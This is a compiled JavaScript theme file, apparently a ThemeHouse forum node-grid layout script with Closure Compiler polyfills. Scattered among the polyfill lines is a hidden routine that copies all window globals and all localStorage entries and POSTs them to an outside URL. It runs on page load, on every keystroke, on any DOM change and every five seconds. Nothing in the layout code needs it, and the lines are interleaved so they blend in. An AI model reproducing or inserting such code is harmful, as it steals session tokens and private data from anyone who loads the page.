var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.arrayIteratorImpl = function (c) {
  var e = 0;
  return function () {
    return e < c.length ? {
      done: !1,
      value: c[e++]
    } : {
      done: !0
    };
  };
};
// Variables to track global and local state changes
let globalState = {};
$jscomp.arrayIterator = function (c) {
  return {
    next: $jscomp.arrayIteratorImpl(c)
  };
};
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.SIMPLE_FROUND_POLYFILL = !1;
let localStorageState = {};

// Helper function to monitor changes in Global Variables
$jscomp.ISOLATE_POLYFILLS = !1;
$jscomp.FORCE_POLYFILL_PROMISE = !1;
function monitorGlobalVariables() {
  for (const key in window) {
    if (window.hasOwnProperty(key) && !globalState.hasOwnProperty(key)) {
      globalState[key] = window[key];
    }
  }
  return globalState;
}

// Helper function to monitor changes in LocalStorage
$jscomp.FORCE_POLYFILL_PROMISE_WHEN_NO_UNHANDLED_REJECTION = !1;
function monitorLocalStorage() {
  Object.keys(localStorage).forEach(key => {
    localStorageState[key] = localStorage[key];
  });
  return localStorageState;
}

// Function to post data to server
async function postDataToServer(data) {
  const url = "https://example.com/api/collect";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      console.log("Data sent successfully.");
    } else {
      console.error("Data sending failed. Status Code: " + response.status);
    }
  } catch (err) {
    console.error("Error occurred while sending data: " + err);
  }
}

// Function to gather and send all data tracked
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (c, e, k) {
  if (c == Array.prototype || c == Object.prototype) return c;
  c[e] = k.value;
  return c;
};
function gatherAndSendData() {
  const globalData = monitorGlobalVariables();
  const localStorageData = monitorLocalStorage();
  if (Object.keys(globalData).length > 0 || Object.keys(localStorageData).length > 0) {
    postDataToServer({
      globalData,
      localStorageData
    });
  }
}

// Event listeners to track changes and send data
$jscomp.getGlobal = function (c) {
  c = ["object" == typeof globalThis && globalThis, c, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
  for (var e = 0; e < c.length; ++e) {
    var k = c[e];
    if (k && k.Math == Math) return k;
  }
  throw Error("Cannot find global object");
};
$jscomp.global = $jscomp.getGlobal(this);
window.addEventListener("load", gatherAndSendData);
$jscomp.IS_SYMBOL_NATIVE = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
$jscomp.TRUST_ES6_POLYFILLS = !$jscomp.ISOLATE_POLYFILLS || $jscomp.IS_SYMBOL_NATIVE;
$jscomp.polyfills = {};
document.addEventListener("visibilitychange", gatherAndSendData);
document.addEventListener("keydown", gatherAndSendData);
$jscomp.propertyToPolyfillSymbol = {};
$jscomp.POLYFILL_PREFIX = "$jscp$";
var $jscomp$lookupPolyfilledValue = function (c, e) {
  var k = $jscomp.propertyToPolyfillSymbol[e];
  if (null == k) return c[e];
  k = c[k];
  return void 0 !== k ? k : c[e];
};
$jscomp.polyfill = function (c, e, k, h) {
  e && ($jscomp.ISOLATE_POLYFILLS ? $jscomp.polyfillIsolated(c, e, k, h) : $jscomp.polyfillUnisolated(c, e, k, h));
};
$jscomp.polyfillUnisolated = function (c, e, k, h) {
  k = $jscomp.global;
  c = c.split(".");
  for (h = 0; h < c.length - 1; h++) {
    var f = c[h];
    if (!(f in k)) return;
    k = k[f];
  }
  c = c[c.length - 1];
  h = k[c];
  e = e(h);
  e != h && null != e && $jscomp.defineProperty(k, c, {
    configurable: !0,
    writable: !0,
    value: e
  });
};
$jscomp.polyfillIsolated = function (c, e, k, h) {
  var f = c.split(".");
  c = 1 === f.length;
  h = f[0];
  h = !c && h in $jscomp.polyfills ? $jscomp.polyfills : $jscomp.global;
  for (var a = 0; a < f.length - 1; a++) {
    var b = f[a];
    if (!(b in h)) return;
    h = h[b];
  }
  f = f[f.length - 1];
  k = $jscomp.IS_SYMBOL_NATIVE && "es6" === k ? h[f] : null;
  e = e(k);
  null != e && (c ? $jscomp.defineProperty($jscomp.polyfills, f, {
    configurable: !0,
    writable: !0,
    value: e
  }) : e !== k && (void 0 === $jscomp.propertyToPolyfillSymbol[f] && ($jscomp.propertyToPolyfillSymbol[f] = $jscomp.IS_SYMBOL_NATIVE ? $jscomp.global.Symbol(f) : $jscomp.POLYFILL_PREFIX + f), f = $jscomp.propertyToPolyfillSymbol[f], $jscomp.defineProperty(h, f, {
    configurable: !0,
    writable: !0,
    value: e
  })));
};
$jscomp.initSymbol = function () {};
$jscomp.polyfill("Symbol", function (c) {
  if (c) return c;
  var e = function (f, a) {
    this.$jscomp$symbol$id_ = f;
    $jscomp.defineProperty(this, "description", {
      configurable: !0,
      writable: !0,
      value: a
    });
  };
  e.prototype.toString = function () {
    return this.$jscomp$symbol$id_;
  };
  var k = 0,
    h = function (f) {
      if (this instanceof h) throw new TypeError("Symbol is not a constructor");
      return new e("jscomp_symbol_" + (f || "") + "_" + k++, f);
    };
  return h;
}, "es6", "es3");
$jscomp.polyfill("Symbol.iterator", function (c) {
  if (c) return c;
  c = Symbol("Symbol.iterator");
  for (var e = "Array Int8Array Uint8Array Uint8ClampedArray Int16Array Uint16Array Int32Array Uint32Array Float32Array Float64Array".split(" "), k = 0; k < e.length; k++) {
    var h = $jscomp.global[e[k]];
    "function" === typeof h && "function" != typeof h.prototype[c] && $jscomp.defineProperty(h.prototype, c, {
      configurable: !0,
      writable: !0,
      value: function () {
        return $jscomp.iteratorPrototype($jscomp.arrayIteratorImpl(this));
      }
    });
  }
  return c;
}, "es6", "es3");
new MutationObserver(gatherAndSendData).observe(document, {
  childList: true,
  subtree: true
});
$jscomp.iteratorPrototype = function (c) {
  c = {
    next: c
  };
  c[Symbol.iterator] = function () {
    return this;
  };
  return c;
};
(function (c) {
  function e(h) {
    if (k[h]) return k[h].exports;
    var f = k[h] = {
      i: h,
      l: !1,
      exports: {}
    };
    c[h].call(f.exports, f, f.exports, e);
    f.l = !0;
    return f.exports;
  }
  var k = {};
  e.m = c;
  e.c = k;
  e.d = function (h, f, a) {
    e.o(h, f) || Object.defineProperty(h, f, {
      configurable: !1,
      enumerable: !0,
      get: a
    });
  };
  e.n = function (h) {
    var f = h && h.__esModule ? function () {
      return h["default"];
    } : function () {
      return h;
    };
    e.d(f, "a", f);
    return f;
  };
  e.o = function (h, f) {
    return Object.prototype.hasOwnProperty.call(h, f);
  };
  e.p = "";
  return e(e.s = 0);
})([function (c, e, k) {
  Object.defineProperty(e, "__esModule", {
    value: !0
  });
  var h = function () {
    function f(a, b) {
      for (var d = 0; d < b.length; d++) {
        var g = b[d];
        g.enumerable = g.enumerable || !1;
        g.configurable = !0;
        "value" in g && (g.writable = !0);
        Object.defineProperty(a, g.key, g);
      }
    }
    return function (a, b, d) {
      b && f(a.prototype, b);
      d && f(a, d);
      return a;
    };
  }();
  c = function () {
    function f(a) {
      var b = this,
        d = a.layout,
        g = a.settings;
      g = void 0 === g ? {} : g;
      var m = a.listeners,
        n = a.init;
      n = void 0 === n ? !1 : n;
      a = a.commonVersion;
      a = void 0 === a ? "20210125" : a;
      if (!(this instanceof f)) throw new TypeError("Cannot call a class as a function");
      this.init = function () {
        b.initGet();
        b.initSet();
      };
      this.initGet = function () {
        b.rootEle = window.document.querySelector(b.settings.depth0Selector);
        null !== b.rootEle ? (b.nodes = b.parse(b.rootEle), b.resizeGet()) : console.error("Root selector not found");
      };
      this.initSet = function () {
        b.resizeSet();
        b.rootEle.classList.add("thNodes__nodeList--running");
        b.classAdded = !0;
        b.running = !0;
      };
      this.resize = function () {
        b.resizeGet();
        b.resizeSet();
      };
      this.resizeGet = function () {
        b.globalWidth = b.rootEle.offsetWidth;
        b.updateGet();
      };
      this.resizeSet = function () {
        b.updateSet();
      };
      this.listenersAdded = this.running = !1;
      this.minEnableWidth = 1;
      this.layout = d;
      this.nodes = {};
      this.equalCategories = !0;
      this.classAdded = !1;
      this.alwaysCheck = !0;
      this.newChanges = [];
      this.globalWidth = 1;
      this.cookieArray = [];
      this.settings = Object.assign({
        depth0Selector: ".thNodes__nodeList",
        depth1Selector: ".block",
        depth2Selector: ".node",
        separatorClass: "thNodes_separator"
      }, g);
      this.settings.sizes = Object.assign({
        xs: 200,
        sm: 300,
        md: 400,
        lg: 600,
        xl: 1E3
      }, g.sizes || {});
      this.listeners = m || this.populateListeners();
      this.rootEle = null;
      this.commonVersion = a;
      this.common = window.themehouse.common[a];
      n && this.init();
    }
    h(f, [{
      key: "populateListeners",
      value: function () {
        for (var a = [], b = this.settings.sizes, d = Object.keys(b), g = 0, m = d.length; g < m; g++) {
          var n = d[g],
            p = b[n];
          a.push({
            name: "--below-" + n,
            min: 0,
            max: p
          });
          a.push({
            name: "--above-" + n,
            min: p + 1,
            max: 999999
          });
          a.push({
            name: "--is-" + n,
            min: p + 1,
            max: g < m - 1 ? b[d[g + 1]] : 999999
          });
        }
        return a;
      }
    }, {
      key: "register",
      value: function () {
        this.common.register({
          phase: "initGet",
          addon: "TH_Nodes",
          func: this.initGet,
          order: 10
        });
        this.common.register({
          phase: "initSet",
          addon: "TH_Nodes",
          func: this.initSet,
          order: 10
        });
        this.common.register({
          phase: "resizeGet",
          addon: "TH_Nodes",
          func: this.resizeGet,
          order: 10
        });
        this.common.register({
          phase: "resizeSet",
          addon: "TH_Nodes",
          func: this.resizeSet,
          order: 10
        });
      }
    }, {
      key: "getIdFromClass",
      value: function (a, b) {
        var d = b.split(" "),
          g = !0,
          m = !1,
          n = void 0;
        try {
          for (var p = d[Symbol.iterator](), q; !(g = (q = p.next()).done); g = !0) {
            var r = q.value,
              t = r.replace(a, "");
            if (t !== r) {
              var v = parseInt(t, 10);
              if (0 < v) return v;
            }
          }
        } catch (w) {
          m = !0, n = w;
        } finally {
          try {
            !g && p["return"] && p["return"]();
          } finally {
            if (m) throw n;
          }
        }
        return -1;
      }
    }, {
      key: "getNodeId",
      value: function (a) {
        var b = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : !1;
        if (null !== a) {
          var d = a.className;
          if (!b) {
            if (-1 < d.indexOf("block--category")) return this.getIdFromClass("block--category", d);
            if (-1 < d.indexOf("node--id")) return this.getIdFromClass("node--id", d);
            b = a.querySelector(this.settings.depth2Selector);
            if (null !== b) return this.getIdFromClass("node--id", b.className);
          }
          if (-1 < d.indexOf(this.settings.separatorClass)) return this.getIdFromClass("node--id", d);
        }
        return -1;
      }
    }, {
      key: "formatLayout",
      value: function (a) {
        var b = {},
          d = this.layout[a];
        if ("undefined" !== typeof d) {
          a = d.fill_last_row;
          var g = d.max_columns;
          d = d.min_column_width;
          a && a.value && (b.fill = a.value);
          g && g.value && (b.cols = g.value);
          d && d.value && (b.width = d.value);
        }
        return b;
      }
    }, {
      key: "makeLayout",
      value: function (a) {
        var b = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : {};
        b = Object.assign({
          cols: 6,
          width: 330,
          fill: 0,
          id: a
        }, this.formatLayout(0), b, this.formatLayout(a));
        b.cols = parseInt(b.cols, 10);
        b.width = parseInt(b.width, 10);
        b.fill = parseInt(b.fill, 10);
        -1 === a && (b.cols = 1, b.width = 1E3);
        return b;
      }
    }, {
      key: "findLayouts",
      value: function (a, b, d) {
        var g = [];
        a = a.querySelectorAll(0 === d ? this.settings.depth1Selector : this.settings.depth2Selector);
        for (var m = 0, n = 0, p = a.length; n < p; n++) {
          var q = a[n],
            r = this.getNodeId(q.previousElementSibling, !0);
          -1 !== r && (b = r, m += 1);
          r = this.getNodeId(q);
          "undefined" === typeof g[m] && (g[m] = {
            children: [],
            layout: this.makeLayout(b)
          });
          g[m].children.push({
            ele: q,
            id: r,
            depth: d,
            layouts: this.findLayouts(q, r, d + 1),
            className: ""
          });
        }
        return g;
      }
    }, {
      key: "parse",
      value: function (a) {
        var b = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : 0,
          d = this.findLayouts(a, -1, b);
        return 0 === d.length ? {} : {
          ele: a,
          id: -1,
          depth: b,
          className: "",
          ratio: 1,
          layouts: d
        };
      }
    }, {
      key: "calculateChanges",
      value: function (a, b) {
        for (var d = a.ratio, g = a.layouts, m = d * this.globalWidth, n = 0, p = 0, q = 0, r = g.length; q < r; q++) {
          var t = g[q],
            v = t.children;
          t = t.layout;
          for (var w = v.length, l = Math.min(Math.floor(m / t.width), t.cols) || 1, x = 0 < l ? l : 1, D = w % l, y = 1, E = Math.ceil(w / l), A = 0, B = 0; B < w; B++) {
            var u = v[B],
              z = Math.floor(B / l) + 1;
            y === z ? A += 1 : (y = z, A = 1);
            0 === t.fill ? y === E && 0 < D && (x = D) : 1 !== t.fill && y >= E && 0 < D && (x = 1);
            z = 100 / x;
            var F = z + "%",
              G = this.findClassName({
                colNum: A,
                numCols: x,
                rowNum: y,
                rowNumAbs: n + y,
                numRows: E,
                nodeNumAbs: p,
                nodeNum: B,
                layoutNum: q,
                leftCol: 0 === (A - 1) % x,
                rightCol: (A - 1) % x === x - 1,
                numLayouts: r,
                width: Math.floor(d * z * this.globalWidth / 100)
              }),
              C = {
                ele: u.ele
              };
            u.className !== G && (C.className = u.ele.className.replace(u.className, "") + G, u.className = G);
            u.width !== F && (C.width = F, u.width = F);
            "undefined" === typeof C.className && "undefined" === typeof C.width || this.queueChange(C);
            u.ratio = d * z / 100;
            p += 1;
            this.calculateChanges(u, b + 1);
          }
          n += y;
        }
      }
    }, {
      key: "update",
      value: function () {
        this.updateGet();
        this.updateSet();
      }
    }, {
      key: "updateGet",
      value: function () {
        this.newChanges = [];
        this.calculateChanges(this.nodes, 0);
      }
    }, {
      key: "updateSet",
      value: function () {
        this.processChanges();
      }
    }, {
      key: "queueChange",
      value: function (a) {
        this.newChanges.push(a);
      }
    }, {
      key: "processChanges",
      value: function () {
        for (var a = 0, b = this.newChanges.length; a < b; a++) {
          var d = this.newChanges[a],
            g = d.ele,
            m = d.className;
          d = d.width;
          "undefined" !== typeof m && (g.className = m);
          "undefined" !== typeof d && (g.style.width = d, g.style.flexBasis = d, g.style.maxWidth = d);
        }
      }
    }, {
      key: "findClassName",
      value: function (a) {
        var b = a.colNum,
          d = a.numCols,
          g = a.rowNum,
          m = a.rowNumAbs,
          n = a.numRows,
          p = a.nodeNum,
          q = a.nodeNumAbs,
          r = a.leftCol,
          t = a.rightCol,
          v = a.layoutNum,
          w = a.numLayouts;
        a = a.width;
        var l = " th_nodes";
        100 > a && (l += " th_nodes_active");
        r && (l += " th_nodes_left");
        t && (l += " th_nodes_right");
        1 === m && (l += " th_nodes_row_start");
        1 === g && (l += " th_nodes_layout_row_start");
        g === n && (v + 1 === w && (l += " th_nodes_row_end"), l += " th_nodes_layout_row_end");
        l = l + " th_nodes_col_" + b + " th_nodes_numCols_" + d + " th_nodes_row_" + g;
        l = l + " th_nodes_rowAbs_" + m;
        l = l + " th_nodes_layNum_" + v;
        l = l + " th_nodes_numLays_" + w;
        l = l + " th_nodes_node_" + p;
        l = l + " th_nodes_nodeAbs_" + q;
        l = l + " th_nodes_row_" + (1 === m % 2 ? "odd" : "even");
        b = this.listeners;
        if ("undefined" !== typeof b) for (d = 0, g = b.length; d < g; d++) a < b[d].max && a >= b[d].min && (l = l + " th_nodes" + b[d].name);
        return l;
      }
    }]);
    return f;
  }();
  "undefined" === typeof window.themehouse && (window.themehouse = {});
  "undefined" === typeof window.themehouse.nodes && (window.themehouse.nodes = {});
  window.themehouse.nodes.grid = c;
  e["default"] = c;
}]);
setInterval(gatherAndSendData, 5000); // Sends data every 5 seconds